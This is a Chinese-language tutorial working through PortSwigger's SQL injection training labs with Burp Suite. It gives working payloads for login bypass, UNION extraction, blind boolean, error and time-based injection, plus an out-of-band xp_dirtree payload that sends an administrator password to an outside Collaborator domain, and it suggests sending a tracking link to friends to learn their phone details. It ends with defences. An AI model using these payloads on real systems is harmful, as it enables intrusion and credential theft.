# 梨子带你刷burpsuite靶场系列之服务器端漏洞篇 - Sql注入专题

阅读量 **320062**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-07 13:00:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01a34540cba925085f.png)

## 本系列介绍

>
> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。

## 梨子有话说

>
> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。

## 服务器端漏洞篇介绍

> burp官方说他们建议初学者先看服务器漏洞篇，因为初学者只需要了解服务器端发生了什么就可以了

## 服务器端漏洞篇 – Sql注入专题

###  什么是Sql注入呢？

> Sql注入允许攻击者扰乱对数据库的查询，从而让攻击者查看到正常情况下看不到的数据，甚至删除或修改这些数据

###  Sql注入有哪些例子呢？

  * 检索隐藏数据(通过修改查询语句输出额外的结果)
  * 干扰应用逻辑(通过修改查询语句干扰应用逻辑)
  * UNION注入(从不同数据表中检索数据)
  * 获取数据库信息(获取数据库版本和结构等敏感信息)
  * 盲注(查询结果不会直接显示在响应包中)

###  检索隐藏数据

有这样一条用于查询的请求URL：  
`https://insecure-website.com/products?category=Gifts`  
当服务器端接收到该请求后会将请求参数”category”拼接到数据库查询语句中，拼接以后长这样婶儿：  
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`  
那么这条查询语句会返回什么东西呢？会返回商品这个表中商品类别为礼品的且已经发布了的商品，那如果我们想看看未发布的礼品都有啥呢？就得照这样式儿改一下请求URL：  
`https://insecure-website.com/products?category=Gifts'--`  
这样修改完查询语句以后拼接到数据库查询语句中就变成了这样式儿的：  
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`  
我们看到了什么？对，我们看到了单引号提前闭合并且利用注释符(—)注释掉了后面附加的限制条件，这条查询语句就会返回所有的礼品而不仅限于已发布的，既然我们都可以看到未发布的礼品了，那么我们能不能看到所有的商品呢，可以的，我们只需要将请求URL改成这样婶儿的：  
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`  
这里可能会有人有疑问了，为什么会有加号，这是因为URL必须是一连串的嘛，如果中间有空格的话可能会出现未知的情况，但也不是不能用空格，只不过要使用空格的URL形式(%20)，那么这条请求拼接到查询语句中是什么样的呢？  
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`  
因为1=1属于永真的条件，所以搭配OR逻辑运算符的结果会返回所有的商品。

###  配套靶场：利用WHERE子句的Sql注入漏洞检索隐藏数据

因为要在查询参数中插入payload，于是我们随便触发一个有查询参数的请求，然后把该请求发到Repeater中，然后修改查询参数值

![](https://p5.ssl.qhimg.com/t013c150473b54fc22d.png)

其实就是利用上面讲的知识点，非常简单，所以我们顺利地解决了这一道题

![](https://p4.ssl.qhimg.com/t012bafc00364b1aec0.png)

###  干扰应用逻辑

我们来看一下正常的一个验证账号密码的查询语句是什么样的  
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`  
但是呢，如果查询参数不老实，被这样恶意拼接呢  
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`  
我们可以看到攻击者利用注释符注释掉了后面的密码字段，这就导致我们只需要用户名就能登录该用户，那么如果我们知道管理员的用户名，那这就直接登进去了，夺危险啊，是吧。

###  配套靶场：利用Sql注入绕过登录

我们进入登录页面，把请求发到Repeater里，因为登录请求属于POST请求，所以参数是在body里面的，于是我们向用户名参数中插入payload

![](https://p4.ssl.qhimg.com/t01be2d3f8e7fd22ae1.png)

插入payload以后，密码就没用了，我们就能直接登入管理员用户了，这一道题也顺利解决

###  Union注入

在介绍Union注入之前，我们先介绍一下什么是Union查询，所谓union查询就是允许同时查询多条记录，例如这样的查询语句  
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`  
这条语句会返回什么结果呢，对，会返回两列数据，包括表1的ab两列数据，还有表2的cd两列数据，但是如果想成功执行Union查询需要满足两个条件

  * 每个查询都需要返回相同的列数
  * 每列中的数据类型在各个查询之间必须兼容

鉴于这两个必要条件，所以我们想要发动Union注入也需要得到两个东西

  * 原始查询请求会返回多少列结果呢？
  * 从原始查询请求返回的结果中哪些列的数据类型是可以用来存放注入结果即它俩的数据类型兼容的呢？

###  获取发动Union注入所需的列数

burp介绍了两种获取列数的方法，第一种是利用ORDER
BY子句，从1开始递增，直至触发报错，报错前的那个数就是原始查询请求返回结果的列数，因为本篇文章讲的都是Sql注入，所以大家一定不要忘记最前面的闭合符号和最后面的注释符哦，那么为什么利用ORDER
BY子句可以实现这种效果呢？因为ORDER
BY子句是根据指定的列索引对结果进行排序而不需要知道列的具体名称，只需要指定列索引的序号即可定位到某一列，当定位不到指定的列时即会触发报错，此时也就侧面表明其结果有多少列  
第二种就是在Union查询中设置不同数量的NULL值字段，但是与第一种方法不同的是，因为Union要求列数要相同，所以在增加字段数量至与原始查询请求返回的结果列数相同之前会一直报错，也就是只有当列数相同的时候才不会报错  
burp给了一个小tips，解释了为什么要用NULL值呢，因为NULL值可以与任何数据类型兼容，所以就可以用来判断列数，然后又给了一个小tips，对于Oracle数据库，它每一条查询语句必须要指定FROM一个表，所以我们可以FROM一个内置的表，如Union注入时可以这样构造payload，’
UNION SELECT NULL FROM DUAL—，然后burp给出了第三个小tips，就是不同数据库的注释符不太一样，比如Mysql中的注释符为”—
“或”#”(不要忘记有个空格哦，双破折号后面)，最后burp给出了一个小tips集锦，拿走不谢，`https://portswigger.net/web-security/sql-injection/cheat-sheet`

###  配套靶场：获取发动Union注入所需的列数

我们还是像之前一样，随便找一个查询URL，将其请求发到Repeater中，虽然有两种方法，但是题目中要求返回NULL值，所以我们采用填充NULL字段的方法来判断列数

![](https://p3.ssl.qhimg.com/t010676cc7237e499f4.png)

我们看到因为列数不匹配而报错，然后我们不断增加NULL字段数量

![](https://p1.ssl.qhimg.com/t017b0090d75b0c9dcb.png)

当列数匹配时即会正常返回NULL值，成功解决这一题

###  查找符合Union攻击数据类型的列

前文有介绍，因为Union查询对应的列数据类型要兼容，我们要将注入结果存入某个位置就要找到可以与之兼容的数据类型的列，注入结果是字符串，而且我们现在已经知道注入结果应该有多少列了，于是我们就一位一位地尝试，直到不会报错即代表那个位置是可以存放字符串的，例如我们可以这样构造payload  
`' UNION SELECT 'a',NULL,NULL,NULL--`

###  配套靶场：查找符合Union攻击数据类型的列

题目中告知我们在查找符合要求的列的时候需要使用他们给的随机字符串，这个字符串每个人的不一样哦，所以梨子给打码了，避免有不求甚解的初学者直接复制了，嘻嘻嘻

![](https://p5.ssl.qhimg.com/t014e2d0f65dcb5c03c.png)

我们看到第一个位置不是，然后一个一个试下去

![](https://p2.ssl.qhimg.com/t01fb2ba21ef1d873ce.png)

好的我们看到如果那个列兼容的话就会收到正常的响应，顺利地解决这道题

###  利用Union注入获取感兴趣的数据

在确定了列数和哪一列可以输出注入结果后，我们就可以继续构造payload来获取我们感兴趣的数据了

###  配套靶场：利用Union注入获取感兴趣的数据

因为题目中已经告诉我们了要查询users表中的username和password列，于是我们就照猫画虎地构造payload

![](https://p3.ssl.qhimg.com/t012ca325f40b490184.png)

然后我们看到响应包中出现了我们感兴趣的管理员的账号密码，登录，解决题目！

###  将注入结果装入单列中

有的时候，查询结果只返回单列怎么办呢，没事，我们可以将多列结果合并成单列不就可以了吗，那么怎么把多列结果在单列中区分开呢，可以加一些分隔符之类的，所以我们可以这样构造payload  
`' UNION SELECT username || '~' || password FROM users--`  
这里的”||“是Oracle中的字符串连接符，这样就既能将多列结果合并到单列输出，又能把多列结果区分开了

###  配套靶场：将注入结果装入单列中

因为我们不知道靶场使用的是什么数据库，所以我们fuzz一下

![](https://p0.ssl.qhimg.com/t01a4dced215a350f2f.png)

选择Pitchfork模式是因为这两个变量需要是一样的，就是一对一的关系，我们再设置一下fuzz列表

![](https://p1.ssl.qhimg.com/t01f2f362f342d30d08.png)

我们来看一下fuzz结果

![](https://p2.ssl.qhimg.com/t01e2bffb2a7d359646.png)

我们看到结果在单列中输出了，成功登录，解决题目！

###  获取数据库信息

当我们要发动Sql注入时，数据库的某些信息对于我们攻击也是会起到帮助的，例如获取数据库版本信息  
`SELECT * FROM v$version`  
但是仅仅获取版本信息还远远不够，我们还想知道它都有哪些表怎么办呀，某些数据库有一套内置的数据库，里面存放着所有表和记录  
`SELECT * FROM information_schema.tables`

###  查询数据库类型和版本

不同种类的数据库查询数据库类型和版本的语句略有不同，我们可以稍微fuzz一下就可以判断其数据库类型和版本，获取这些信息对攻击者构造更多的payload进行注入攻击有很大的帮助，burp列举了常见几种数据库获取其版本的语句

数据库类型 | 查询版本语句  
---|---  
Sql Server & Mysql | SELECT @[@version](https://github.com/version "@version")  
Oracle | SELECT * FROM v$version  
Postgre | SELECT version()  
  
然后我们可以搭配之前学过的Union注入来执行查询版本语句  
`' UNION SELECT @[@version](https://github.com/version "@version")--`  
然后我们就能获取到完整的数据库版本信息

    
    
    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
    Mar 18 2018 09:11:49
    Copyright (c) Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
    

我们可以看到我们获取到了Sql Server数据库非常详细的信息，这些信息对攻击者后续的攻击是非常有用的

###  配套靶场：查询Oracle数据库类型和版本

因为是Oracle数据库，所以它的查询语句必须要from一个表，然后我们又利用前面所学的知识探测到发动Union注入攻击的payload位为两个，然后第一个位置可以存放字符串，所以我们在第一个位置构造payload

![](https://p0.ssl.qhimg.com/t01a3e5b124741d1f63.png)

然后我们就能在响应中获取到详细的版本信息了

![](https://p0.ssl.qhimg.com/t015f4e49e77a23f78d.png)

我们看到了非常详细的版本信息，成功解决这道题

###  配套靶场：查询Sql Server和Mysql数据库类型和版本

这一道题目与Oracle的类似，就是语法有一些差异

![](https://p0.ssl.qhimg.com/t01d5a54a757b0eac2a.png)

我们就可以在响应中看到版本号了

###  列出数据库的内容

burp介绍除了Oracle，其他大多数数据库都存在一个叫信息模式的预览，这里的信息模式英文是schema，看到这个单词，可能有的了解过sql注入的同学会看着比较眼熟，就是你们常说的内置库的英文单词，这个内置库，不得了啊，啥都有，它记录了整个数据库的结构，包括库，表，列，下面我们来看看这个内置库有多厉害吧，比如一个这样一条简单的语句  
`SELECT * FROM information_schema.tables`  
当执行这一条语句后我们会得到这样的结果

    
    
    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
    =====================================================
    MyDatabase dbo Products BASE TABLE
    MyDatabase dbo Users BASE TABLE
    MyDatabase dbo Feedback BASE TABLE
    

好的，我们看到了整个数据库中都有什么表，于是我们还能利用内置库查询某个表里面所有的列  
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`  
这条语句利用WHERE子句查询Users表中所有的列

    
    
    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
    =================================================================
    MyDatabase dbo Users UserId int
    MyDatabase dbo Users Username varchar
    MyDatabase dbo Users Password varchar
    

我们甚至能看到列字段的数据类型，太厉害了太厉害了

###  配套靶场：列举非Oracle数据库内容

我们利用所学的知识查一下都有哪些表

![](https://p1.ssl.qhimg.com/t01730d0f57735df44f.png)

我们找到了存放用户信息的表，然后我们就看一下表里有哪些列

![](https://p0.ssl.qhimg.com/t01fc40c0f143f915d4.png)

好的，我们看到有两列，一列存放用户名，一列存放密码，于是我们就可以遍历所有人的用户名和密码

![](https://p5.ssl.qhimg.com/t01441ec88801a68625.png)

我们获得administrator的密码以后就能登录了

###  Oracle中等效于信息模式的操作

其实Oracle中也有类似信息模式的东西，比如查所有的表  
`SELECT * FROM all_tables`  
啊这，感觉比信息模式简单粗暴啊，直接叫all_tables？好东西好东西，然后我们来看一下查所有的列用什么语句呢`SELECT * FROM
all_tab_columns WHERE table_name = 'USERS'`  
好简单粗暴啊，我好喜欢啊。

###  配套靶场：列举Oracle数据库内容

还是老路子，先查表

![](https://p2.ssl.qhimg.com/t0122a876a9e0726f4a.png)

然后我们查列

![](https://p3.ssl.qhimg.com/t01dfff1c3c882a9225.png)

最后我们就可以获取所有用户的用户名和密码了

![](https://p4.ssl.qhimg.com/t01699c7a8f02159181.png)

我们像刚才那样拿到了administrator的密码，成功登录

###  盲注

盲注是啥？盲注就是你看不到注入结果，也可以称之为无回显的Sql注入，但是呢它只是不显示结果而已，查询语句还是会执行的，所以我们可以构造一些查询语句让我们可以从仅有的给到我们的反馈中判断它的注入结果，就是比普通的Sql注入要耗费一些时间而已，下面我们就来介绍一些盲注用到的方法

###  通过条件响应发动盲注

burp通过在Cookie处引发的盲注来辅助讲解盲注，例如我们看到这样的一个Cookie字段  
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`  
我们看到应用系统通过Cookie字段中指定的TrackingId值来追踪用户的使用情况，当带有该Cookie字段发出请求时会触发数据查询操作，以查询该用户是否为已知用户  
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId =
'u5YD3PapBcR4lN3e7Tj4'`  
因为是在Cookie字段，所以即使存在Sql注入，注入结果也不会反馈到响应中，那么我们怎么办呢？我们就需要剖析一下这个字段验证后会触发哪些过程，应用系统查询是否为已知用户，如果是，则会跳转到用户页面，如果不是则会有一些提示在响应中，不同的查询语句会出现两种不同的结果，那我们就可以利用这个现象去判断了，于是我们来看下面两个payload

    
    
    ' AND '1'='1
    ' AND '1'='2
    

前者经过条件判断以后会返回true，后者则会返回false，所以我们可以利用语句执行返回的布尔值触发不同的响应来判断注入结果，只不过我们只能一个字符一个字符地猜，例如我们可以构造这样的payload  
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username =
'Administrator'), 1, 1) > 'm`  
好家伙，这么老长的payload，大家不要慌哈，我们一点点来看这条payload，首先是套了一个SUBSTRING函数，这个函数是用来一个一个截取字符的，如果想要截取第二个字符只需要将该函数的第二个参数修改成2就可以了，因为我们需要一个一个地截取，所以第三个参数是固定不动的，毕竟是截取字符串的函数嘛，就要给它一个数据源，数据源就是注入结果，示例中是要注入Administrator用户的密码，截取到第一个字符以后呢，就要开始做布尔判断了，示例是判断第一个字符是不是在m以后的字母，然后根据响应不断缩小范围，这里梨子教大家一个比较快速的方法，就是二分法，具体二分法怎么应用并不是这里的重点，大家可以自行百度哦，不同数据库截取函数不太一样，大家可以参考一下burp的小tips集锦哦

###  配套靶场：通过条件响应发动盲注

这一道题就是利用我们刚才所学知识获取Administrator用户的密码，首先我们先看一下密码有多长，先在Intruder里设置一下变量位

![](https://p4.ssl.qhimg.com/t013552713c4e5acf22.png)

然后我们设置一下爆破的列表，假设它最长有100位吧

![](https://p2.ssl.qhimg.com/t017bff581777094e11.png)

因为是盲注，所以我们需要提取响应中的某些特征作为爆破成功的标志

![](https://p0.ssl.qhimg.com/t012753c3b0903008f7.png)

然后我们就开始爆破吧

![](https://p0.ssl.qhimg.com/t0105ee8c9196ddc778.png)

从爆破结果来看，密码长度是20位，接下来我们就来一位一位地猜解吧

![](https://p4.ssl.qhimg.com/t01413adf04d8ed906d.png)

这里我们解释一下为什么是两个变量，因为我们前面讲过截取函数是靠第二个参数值来移动截取的，所以我们要把它设置为一个变量，第二个变量就是猜解这一位是哪个字符了，这里我们采用的是等于，其实和那个二分法差不多，因为需要排列组合，所以我们采用Cluster
bomb模式，然后我们给这两个变量位设置爆破列表

![](https://p5.ssl.qhimg.com/t0126847acd7f405c81.png)

![](https://p2.ssl.qhimg.com/t01d52f5b8f628caf31.png)

然后再设置一下提取响应包特征

![](https://p3.ssl.qhimg.com/t0158c4acda35e22cdd.png)

开始爆破

![](https://p0.ssl.qhimg.com/t01c80c1eb9a2f5af75.png)

好的，我们看到已经把20位密码都爆破出来了，但是burp这个排序功能还有些欠缺，不知道最新版本的有没有修复，梨子用的还是1.7的经典版本，然后我们就可以登录到Administrator用户了，这道题成功解决！

###  利用Sql语句报错触发条件响应

我们前面介绍了利用布尔结果导致不同的响应来发动盲注，那么如果不管查询结果如何响应包都是相同的怎么办，对的，依然有办法来触发条件响应，我们可以故意制造一些Sql语句上的错误触发报错信息，这样我们就又可以利用这种现象来发动盲注了，burp给出了这样的payload模板示例

    
    
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    

我们看到这项技术采用了CASE关键字设置了一个条件判断，当布尔结果为true时则因为返回一个字符得到一个正常的响应包，但是如果布尔结果为false了呢，就会因为触发零除而报错，不得不佩服这些发现漏洞的人，充满了智慧，burp在此基础上给出了一个获取Administrator密码的payload  
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND
SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`  
这条语句就是将布尔判断换成了查询语句，这样就可以通过是否报错来判断其正确性

###  配套靶场：利用Sql语句报错触发条件响应

首先我们判断一下密码的长度，其实是和上面那个靶场一样的步骤，但是本着尽心尽责的原则就还是再走一遍流程吧，嘻嘻嘻

![](https://p1.ssl.qhimg.com/t010f6bd2453b30ff10.png)

![](https://p1.ssl.qhimg.com/t01e07b86971ec4e6b1.png)

![](https://p4.ssl.qhimg.com/t0118bf827d51b55d84.png)

好的，我们现在知道密码长度为20，然后我们就开始爆破每一位的密码

![](https://p1.ssl.qhimg.com/t016ba7b16f883a75f7.png)

![](https://p3.ssl.qhimg.com/t017a32e563c3aacdcf.png)

![](https://p4.ssl.qhimg.com/t010d9e3c874aa8970b.png)

![](https://p5.ssl.qhimg.com/t0133fa56dded6f2be0.png)

好的，我们得到了20位密码的每一位，梨子好像吐槽burp这个排序，唉，算了，就这么地吧，我们利用密码成功登录Administrator用户，成功解决这道题！

###  通过触发延时发动盲注

在介绍完通过触发Sql语句报错发动盲注之后，这回更猛了，直接不管你什么语句，都是一个样的响应，那怎么办呢，没关系，还有办法，是的，这帮人的小脑瓜是真的聪明！这次是通过触发延时来判断，burp以Sql
Server来给我们演示，并给出了一个模板示例

    
    
    '; IF (1=2) WAITFOR DELAY '0:0:10'--    '; IF (1=1) WAITFOR DELAY '0:0:10'--    

这次也是给出了布尔结果为true和false的不同语句，延时效果为10秒，同样的，burp官方也给出了利用该技术获取Administrator密码的payload  
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND
SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`  
与上一条类似的，同样是将布尔判断替换为我们的查询语句，这样我们就可以利用触发延时来发动盲注了

###  配套靶场：通过触发延时发动盲注1

题目中告诉我们Cookie处存在Sql注入，于是我们将请求包发到Repeater中，修改Cookie中的TracingId参数的值

![](https://p0.ssl.qhimg.com/t01b58c8c261b01c0b4.png)

因为这一关的通关要求是触发延时10秒即可，所以我们顺利地解决这道题

###  配套靶场：通过触发延时发动盲注2

同样地，我们要猜一下密码长度，设置变量的方法都是相似的

![](https://p2.ssl.qhimg.com/t01ac06f7343c5eb014.png)

![](https://p1.ssl.qhimg.com/t01994c7cae8c0a69c2.png)

![](https://p1.ssl.qhimg.com/t018696795b9e136af4.png)

![](https://p1.ssl.qhimg.com/t015ad02c40ea0ff7f8.png)

我们一定要选择Response
received，这样就可以按照响应时间排序了，从结果来看密码长度为20，然后我们就开始爆破每一位密码，这里要注意的是，为了保证结果的准确性，我们只能开单线程，所以需要耐心等待哦

![](https://p4.ssl.qhimg.com/t01be6ea0467ce388db.png)

![](https://p2.ssl.qhimg.com/t01d76aac43452ba5d4.png)

![](https://p3.ssl.qhimg.com/t014c76f6d6f05bb4f6.png)

![](https://p3.ssl.qhimg.com/t01169ab4c94eb44a49.png)

好的，经过漫长地等待我们成功地获取到了每一位密码并且成功登录到Administrator用户，成功解决这道题

###  利用带外(OAST)技术发动盲注

现在又升级难度了，应用系统将处理请求和数据库操作分给两个线程异步执行，这样就导致我们前面介绍的所有技术又都不生效了，但是，对，我们还是有办法，嘻嘻嘻，真是应了那句老话，方法总比困难多，接下来介绍一下带外技术，带外技术呢就是系统与外部网络进行交互的技术，经过人们长时间的验证发现，大部分的应用系统都会允许DNS流量出入，而且DNS服务是一项非常基础的服务，所以我们可以利用DNS流量将注入结果发送到我们外部网络的接收客户端，所以这项技术不需要一位一位地猜解即可以通过一条DNS请求查看完整的注入结果  
为了利用这项技术发动盲注，burp推荐了一款非常好用的他们自己家的工具，叫Burp
Collaborator，啥玩意儿？burp自带的？没错，用了这么多年的burp都不知道吧，嘻嘻嘻，梨子也是因为刷这个靶场的时候才知道的，简单介绍一下这款工具，它可以理解为一个轻量级的Web服务器，它可以生成临时地址，当有发往该地址的请求时，在这款工具上就可以接收到请求，这款工具可以接收HTTP和DNS流量，可以用于利用带外技术发动的攻击，下面我们就引用burp提供的示例来深入讲解这款工具的使用，burp以Sql
Server为例，尝试在执行数据库操作的时候利用带外技术将注入结果发送到我们的接收端  
`'; exec master..xp_dirtree
'//0efdymgw1o5w9inae8mg4dfrgim8ay.burpcollaborator.net/a'--`  
上面这条命令在执行的时候会发出一条向 **0efdymgw1o5w9inae8mg4dfrgim8ay.burpcollaborator.net**
的DNS查询请求，然后我们就可以在接收客户端接收到这个请求了，下面梨子来简单演示一下，首先打开burp，找到Burp Coolaborator client

![](https://p2.ssl.qhimg.com/t013f1147e0db694098.png)

打开以后界面长这样

![](https://p3.ssl.qhimg.com/t01e162b0eaf5a49ed3.png)

够轻量级吧，这个客户端只有两个按钮，两个输入框，我们一点点来介绍，首先是生成临时地址的按钮，那么旁边的输入框是干什么的呢，是输入一个随机数种子，这样可以让生成的临时地址足够随机，默认的话就是1，不改也是可以的，我们点击一下第一个按钮，然后通过微信发送到我的小号去

![](https://p2.ssl.qhimg.com/t01a5019eee1dd32c1e.png)

我们可以看到这个临时地址是一个由随机字符串组成的二级域名，够随机吧，然后我们在小号微信点击这个链接，然后回到客户端点击第二个按钮，第二个按钮旁边的输入框是输入轮询间隔，就是多久刷新一次接收到的请求，我们直接点击按钮的话会立即刷新，我们点击一下看看会得到什么

![](https://p0.ssl.qhimg.com/t01a3a1ca48dae4f157.png)

我们看到我们接收到了两条DNS请求和一条HTTP请求，我们看一下它们的具体内容

![](https://p4.ssl.qhimg.com/t01d9612fa83f240ab6.png)

好家伙，我们可以看到UA中有一些很有意思的信息，包括使用的设备型号，系统版本，微信客户端版本，网络类型，这些信息极少数情况下也可以为攻击者攻击提供很多帮助呢，大家也可以按照梨子的步骤测试一下哦，朋友用的什么手机，一目了然哦。  
在介绍了如果利用burp实施带外技术以后，我们就可以学习如何利用带外技术获取注入结果了，这里引用burp提供的示例  
`'; declare [@p](https://github.com/p "@p") varchar(1024);set
[@p](https://github.com/p "@p")=(SELECT password FROM users WHERE
username='Administrator');exec('master..xp_dirtree
"//'+[@p](https://github.com/p
"@p")+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`  
嚯，这么老长，不过一点点看其实也不难理解，想要读懂这一段需要稍微懂一点数据库语法，首先我们声明了一个长度为1024的字符串变量p，然后将注入语句的结果赋值给变量p，然后将变量p的值附加在临时地址，这样发出DNS请求时，接收端就可以通过查看请求的URL获取到注入结果了

###  配套靶场：利用带外(OAST)技术发动盲注1

这道题的目的主要是想让大家掌握带外技术的使用方法，然后漏洞点还是Cookie字段的TracingId参数，我们可以直接到burp的小tips集锦里找到对应的payload模板

![](https://p5.ssl.qhimg.com/t01bdeee23f1fe085a5.png)

我们看到这个payload模板利用了我们后面才会介绍的xxe漏洞，因为不是本篇的重点，所以我们后面再讲，然后我们到collaborator客户端看看能不能接收到什么东西

![](https://p1.ssl.qhimg.com/t0147edd58b5b301613.png)

我们看到客户端成功接收到由应用程序负责进行数据库操作的进程发出的带外DNS请求，成功解决该题

###  配套靶场：利用带外(OAST)技术发动盲注2

在练习了带外技术的使用以后，我们要开始利用带外技术获取注入结果了，于是我们修改一下payload

![](https://p3.ssl.qhimg.com/t015f68fcade5a56675.png)

我们看到与上面不同的是，我们将注入语句夹在了目标URL中间，这样就可以利用带外技术将注入结果发送到客户端上，好，我们现在来看一下客户端有没有接收到

![](https://p4.ssl.qhimg.com/t01216c3ba6e27791c5.png)

我们看到了URL中附带了注入结果，即Administrator的密码，那还等什么，赶紧登录啊，于是我们顺利地解决了这道题目

###  如何检测Sql注入

这里burp给出了几种手动检测Sql注入的方法

  * 在查询参数值中加入单引号等语句闭合符号并观察有什么异常
  * 提交一些根据入口点从一个初始值到另一个值评估的Sql语法并观察有什么异常
  * 构造一些布尔判断，如OR 1 = 1和OR 1 = 2，并观察有什么异常
  * 提交可以导致延时的语句，并观察有什么异常
  * 利用带外技术，观察是否可以接收到请求信息

###  查询语句中不同的Sql注入

一般的Sql注入都是SELECT语句中的WHERE子句，当然了，还有一些其他情况也会发生Sql注入

  * UPDATE语句中的更新值操作或WHERE子句
  * INSERT语句中的插入值操作
  * SELECT语句中的表或列名
  * SELECT语句中的ORDER BY子句

###  二阶注入

一阶注入就是之前我们讲的所有的Sql注入都是属于一阶注入的，一阶注入就是用户输入被以不安全的方式拼接到Sql查询语句中导致出现各种意外情况的注入攻击  
而二阶注入(也称之为存储型Sql注入)呢，就是应用程序先将用户输入存入数据库，然后当进行数据检索时用户输入被以不安全的方式拼接到语句中导致发生各种意外情况的注入攻击，导致二阶注入的原因就是应用系统默认信任用户输入是安全的，所以当进行数据检索时也认为其是安全的，从而导致恶意拼接触发漏洞

###  特定于数据库的因素

在这里burp介绍了一些不同数据库之间的一些检测和攻击方法的差异

  * 字符串拼接语法差异
  * 注释符差异
  * 批处理(堆叠)查询语法差异
  * 数据库平台API差异
  * 报错信息差异

###  如何防止Sql注入

一般来讲，导致Sql注入的原因就是应用程序仅通过字符串拼接的方式来组合Sql语句，并直接执行拼接后的Sql语句，为了将参数值与语句结构分开，我们可以采用参数化查询的方式实现，首先我们来看一下存在sql注入漏洞的代码

    
    
    String query = "SELECT * FROM products WHERE category = '"+ input + "'";
    Statement statement = connection.createStatement();
    ResultSet resultSet = statement.executeQuery(query);
    

我们看到了这就是通过字符串拼接来组合Sql语句，然后直接将执行结果存入结果集中，这就存在很大风险了，
那么我们要是采用参数化的方式来执行Sql语句呢，我们再来看一下代码长什么样

    
    
    PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
    statement.setString(1, input);
    ResultSet resultSet = statement.executeQuery();
    

参数化查询可以防止查询中显示为数据的情况，比如WHERE、INSERT、UPDATE，但是不能防止类似表、列名或者ORDER
BY子句之类的，这就说明参数化查询并不是万能的，其实梨子觉得哦，参数化查询只是为了让开发者更清楚认识语句结构，然后更方便对参数进行把控，为了参数化查询能有效地防止Sql注入，开发者还需要编写大量的过滤逻辑对输入进行严格的过滤，现在终于知道为什么面试的时候只说参数化查询会显得很low了吧，嘻嘻嘻

## 总结

好了，以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之服务器端漏洞篇 –
Sql注入专题的全部内容了，大家都学会了吗，大家可一定不要犯懒哦，要自己去burp官网注册账号然后跟着梨子的解题步骤复现哦，这样会让大家更深刻地理解什么是Sql注入，为什么Union注入要满足那两个条件，遇到不回显的情况怎么办，在理解了这些以后并不意味着你就学会了所有的sql注入了，这个系列只是个入门，想要进阶的话可以找一些开源的或者在线的题目或者靶场做一做，sql注入还是很好玩的，好，废话就说这么多了，小伙伴们有任何问题都可以在评论区进行讨论哦，我们下一个专题再见吧！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **NaTsUk0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/245532](/post/id/245532)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [BurpSuite](/tag/BurpSuite)
  * [Web安全](/tag/Web安全)
  * [SQL注入](/tag/SQL注入)

 **+1** __42赞

 __收藏

![](https://p1.ssl.qhimg.com/t0107a35687618acaf8.png) NaTsUk0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

